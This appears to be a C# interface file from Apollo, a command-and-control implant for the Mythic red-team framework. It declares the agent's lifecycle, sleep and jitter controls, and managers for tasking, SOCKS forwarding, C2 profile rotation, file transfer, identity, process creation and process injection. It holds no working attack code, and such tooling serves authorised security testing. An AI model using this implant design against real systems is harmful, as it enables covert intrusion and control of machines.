using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using ApolloInterop.Types.Delegates;
using ApolloInterop.Structs.MythicStructs;
using System.Threading;

namespace ApolloInterop.Interfaces
{
    public interface IAgent
    {
        // Start the agent.
        void Start();

        // Kill the agent.
        void Exit();

        // Set agent sleep
        void SetSleep(int seconds, double jitter=0);

        // Do sleep until a wait handle triggers
        void Sleep(WaitHandle[] handles = null);

        // Return if we're connected to Mythic or another peer
        bool IsAlive();

        // Return the current UUID of the agent.
        string GetUUID();

        // Lock standard handles of the agent.
        void AcquireOutputLock();

        // Release the lock on the standard handles of the agent.
        void ReleaseOutputLock();

        // Return the ITaskManager interface. Manages all aspects of tasking.
        ITaskManager GetTaskManager();

        // Return the IPeerManager interface. Manages connected P2P nodes.
        IPeerManager GetPeerManager();

        // Return the ISocksManager interface. Responsible for forwarding SOCKS packets.
        ISocksManager GetSocksManager();

        // Return the IC2ProfileManager interface. Used to add, update, delete, or change C2 rotations.
        IC2ProfileManager GetC2ProfileManager();

        // Return the IFileManager interface. Used to get and push files to Mythic.
        IFileManager GetFileManager();

        // Return the IIdentityManager interface. Used for updating currently executing identity context.
        IIdentityManager GetIdentityManager();

        // Return IProcessManager interface. Used for creating new processes.
        IProcessManager GetProcessManager();

        // Return IInjectionManager interface. Used for managing how injection is performed and injecting into processes
        IInjectionManager GetInjectionManager();

        // Return IApi interface. Used for resolving native Win32 API calls, RSA cryptography, and otherwise.
        IApi GetApi();
    }
}
